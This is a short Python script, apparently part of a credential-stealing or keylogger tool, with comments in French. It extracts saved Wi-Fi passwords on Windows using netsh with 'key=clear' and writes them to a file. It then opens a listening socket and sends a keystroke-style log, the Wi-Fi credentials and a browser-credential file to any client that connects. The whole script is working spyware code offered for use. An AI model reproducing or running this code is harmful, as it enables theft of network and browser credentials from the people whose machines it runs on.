import socket
import subprocess

#Marche pour un windows
def get_network_credential():
    f = open("network_cred.txt", "w+")
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
            '\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            f.write("{:<30}|  {:<}".format(i, results[0]))
            f.write("\n")
        except IndexError:
            f.write("{:<30}|  {:<}".format(i, ""))
            f.write("\n")
    f.close()


s = socket.socket()
host = socket.gethostname()
port = 12345
s.bind((host, port))
s.listen(1)
print(host)
print("Waiting for any incoming connections ...")
conn, addr = s.accept()
print(addr, "Has connected to the server")

#envoie des log
filename = "log.txt"
file = open(filename, "rb")
file_data = file.read(1024)
conn.send(file_data)

#envoie des network credential
filename_network = "network_cred.txt"
file_cred = open(filename_network, "rb")
file_data_cred = file_cred.read(1024)
conn.send(file_data_cred)


#envoie des browser credential
filename_browser= "browser_cred.txt"
file_browsee = open(filename_browser, "rb")
file_data_browser = file_browsee.read(1024)
conn.send(file_data_browser)

print("Data has been transmitted successfully")